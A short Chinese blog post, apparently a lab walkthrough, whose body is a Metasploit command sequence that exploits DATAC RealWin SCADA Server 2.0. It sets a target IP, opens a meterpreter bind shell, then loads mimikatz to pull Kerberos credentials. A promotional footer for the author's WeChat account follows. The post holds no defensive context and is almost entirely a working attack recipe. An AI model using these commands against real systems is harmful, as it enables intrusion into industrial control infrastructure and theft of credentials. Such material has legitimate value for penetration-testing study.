---
layout: post
category: binghe-code-hack
title: 利用Metasploit渗透DATAC-RealWin-SCADA Server2.0
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 利用Metasploit渗透DATAC-RealWin-SCADA Server2.0
lock: need
---

# 利用Metasploit渗透DATAC-RealWin-SCADA Server2.0

```
msfconsole
use exploit/windows/scada/realwin_scpc_initialize
set RHOST 192.168.109.141
set payload windows/meterpreter/bind_tcp
show options
exploit
sysinfo
load mimikatz
kerberos
```


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)